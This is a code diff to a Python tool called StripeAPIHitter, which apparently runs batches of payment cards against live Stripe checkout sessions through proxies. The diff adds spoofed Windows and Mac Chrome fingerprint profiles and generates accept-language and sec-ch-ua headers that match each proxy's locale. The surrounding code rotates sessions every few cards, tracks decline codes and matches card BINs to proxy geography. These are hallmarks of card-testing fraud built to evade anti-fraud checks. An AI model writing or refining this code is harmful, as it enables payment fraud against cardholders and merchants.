@@ -42,14 +42,57 @@ BROWSER_PROFILES = [
         "color_depth": "24",
         "screen_height": "873",
         "screen_width": "393",
-        "device_memory": 8,
-        "hardware_concurrency": 8,
+        "device_memory": 4,
+        "hardware_concurrency": 4,
         "max_touch_points": 5,
         "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
         "sec-ch-ua-mobile": "?1",
         "sec-ch-ua-platform": '"Android"'
     },
+    {
+        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "impersonate": "chrome131",
+        "platform": "Win32",
+        "color_depth": "24",
+        "screen_height": "1080",
+        "screen_width": "1920",
+        "device_memory": 8,
+        "hardware_concurrency": 8,
+        "max_touch_points": 0,
+        "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": '"Windows"'
+    },
+    {
+        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "impersonate": "chrome131",
+        "platform": "MacIntel",
+        "color_depth": "30",
+        "screen_height": "1080",
+        "screen_width": "1920",
+        "device_memory": 16,
+        "hardware_concurrency": 8,
+        "max_touch_points": 0,
+        "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": '"macOS"'
+    }
 ]
+
+def get_accept_language(locale: str) -> str:
+    if not locale or locale.startswith('en'):
+        if locale == 'en-GB': return "en-GB,en-US;q=0.9,en;q=0.8"
+        elif locale == 'en-CA': return "en-CA,en-US;q=0.9,en;q=0.8"
+        elif locale == 'en-AU': return "en-AU,en-US;q=0.9,en;q=0.8"
+        elif locale == 'en-IN': return "en-IN,en-US;q=0.9,en;q=0.8"
+        return "en-US,en;q=0.9"
+    lang = locale.split('-')[0]
+    return f"{locale},{lang};q=0.9,en-US;q=0.8,en;q=0.7"
+
+def get_sec_ch_ua(user_agent: str) -> str:
+    match = re.search(r'Chrome/(\d+)', user_agent)
+    ver = match.group(1) if match else "131"
+    return f'"Google Chrome";v="{ver}", "Chromium";v="{ver}", "Not_A Brand";v="24"'
 CARDS_PER_SESSION = 3  # Rotate session every N cards
 
 STRIPE_DECLINE_CODES = {
@@ -850,6 +893,9 @@ class StripeAPIHitter:
                 if "sec-ch-ua-platform" in profile: headers["sec-ch-ua-platform"] = profile["sec-ch-ua-platform"]
 
                 address, tz_id, locale = await RandomData.get_address_and_timezone(proxy_url if proxies else None)
+                accept_lang = get_accept_language(locale)
+                
+                headers["accept-language"] = accept_lang
                 
                 # Cache proxy geo for future BIN-to-proxy matching
                 if proxy_data and address.get('country'):
@@ -881,7 +927,7 @@ class StripeAPIHitter:
                     try:
                         warmup_headers = {
                             "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-                            "accept-language": "en-US,en;q=0.9",
+                            "accept-language": accept_lang,
                             "accept-encoding": "gzip, deflate, br",
                             "sec-fetch-dest": "document",
                             "sec-fetch-mode": "navigate",
@@ -1000,7 +1046,7 @@ class StripeAPIHitter:
                     elements_url = f"https://api.stripe.com/v1/elements/sessions?key={self.pk_live}&locale={locale}&type={el_type}&payment_pages_checkout_session={self.cs_live}"
                     el_headers = headers.copy()
                     el_headers["referer"] = checkout_page_url
-                    el_headers["accept-language"] = "en-US,en;q=0.9"
+                    el_headers["accept-language"] = accept_lang
                     el_headers["Stripe-Version"] = "2026-06-24.dahlia"
                     el_headers["sec-fetch-site"] = "same-site"
                     el_headers["sec-fetch-mode"] = "cors"
@@ -1013,7 +1059,7 @@ class StripeAPIHitter:
 
                 pm_headers = headers.copy()
                 pm_headers["Idempotency-Key"] = pm_idempotency
-                pm_headers["accept-language"] = "en-US,en;q=0.9"
+                pm_headers["accept-language"] = accept_lang
                 pm_headers["sec-fetch-site"] = "same-site"
                 pm_headers["sec-fetch-mode"] = "cors"
                 pm_headers["sec-fetch-dest"] = "empty"
@@ -1084,7 +1130,7 @@ class StripeAPIHitter:
                 confirm_headers = headers.copy()
                 confirm_headers["Idempotency-Key"] = confirm_idempotency
                 # Real browsers always send sec-fetch headers on XHR/fetch calls from a loaded page
-                confirm_headers["accept-language"] = "en-US,en;q=0.9"
+                confirm_headers["accept-language"] = accept_lang
                 confirm_headers["sec-fetch-site"] = "same-site"
                 confirm_headers["sec-fetch-mode"] = "cors"
                 confirm_headers["sec-fetch-dest"] = "empty"
